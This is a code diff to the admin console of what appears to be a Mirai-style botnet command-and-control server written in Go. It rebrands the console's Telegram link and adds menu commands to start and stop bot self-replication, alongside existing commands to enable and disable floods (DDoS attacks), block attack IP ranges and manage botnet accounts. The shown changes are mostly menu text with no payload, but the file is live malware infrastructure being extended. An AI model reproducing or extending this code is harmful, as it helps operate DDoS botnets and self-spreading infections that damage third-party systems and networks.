@@ -27,7 +27,7 @@ func (this *Admin) Handle() {
 	var attackStatus int = 0
     attackStatusPointer := &attackStatus
     this.conn.Write([]byte("\033[1;37m\033[2J\033[1H"))
-	this.conn.Write([]byte(fmt.Sprintf("\033]0;https://t.me/VagnerRaw.\007")))
+	this.conn.Write([]byte(fmt.Sprintf("\033]0;https://t.me/GodSendRaw.\007")))
     this.conn.Write([]byte("Username\033[1;35m- \033[1;37m"))
   username, err := this.ReadLine(false)
   if err != nil {
@@ -136,13 +136,15 @@ func (this *Admin) Handle() {
 		}
 
 		if userInfo.admin == 1 && cmd == "admin" {
-			this.conn.Write([]byte("\033[1;36mremoveuser      \033[1;35m- \033[1;37mremove a user.\r\n"))
+			this.conn.Write([]byte("\033[1;36mstartrep      \033[1;35m- \033[1;37mStarts Selfrep on The bot.\r\n"))
+			this.conn.Write([]byte("\033[1;36mstoprep      \033[1;35m- \033[1;37mStops Selfrep on The bot.\r\n"))
+			this.conn.Write([]byte("\033[1;36mremoveuser      \033[1;35m- \033[1;37mRemove a User.\r\n"))
 			this.conn.Write([]byte("\033[1;36maddbasic        \033[1;35m- \033[1;37mAdd a Basic Acount.\r\n"))
 			this.conn.Write([]byte("\033[1;36maddadmin        \033[1;35m- \033[1;37mAdd a Admin Account.\r\n"))
 			this.conn.Write([]byte("\033[1;36musers/members 	\033[1;35m- \033[1;37mShow All Network's Users.\r\n"))
 			this.conn.Write([]byte("\033[1;36mblock/unblock 	\033[1;35m- \033[1;37mBlock/Unblock Attacks On A Ip Range.\r\n"))
 			this.conn.Write([]byte("\033[1;36mfloods enable 	\033[1;35m- \033[1;37mEnable Attacks.\r\n"))
-			this.conn.Write([]byte("\033[1;36mfloods disable 	\033[1;35m- \033[1;37mdisable Attacks.\r\n"))
+			this.conn.Write([]byte("\033[1;36mfloods disable 	\033[1;35m- \033[1;37mDisable Attacks.\r\n"))
 			continue
 		}
 
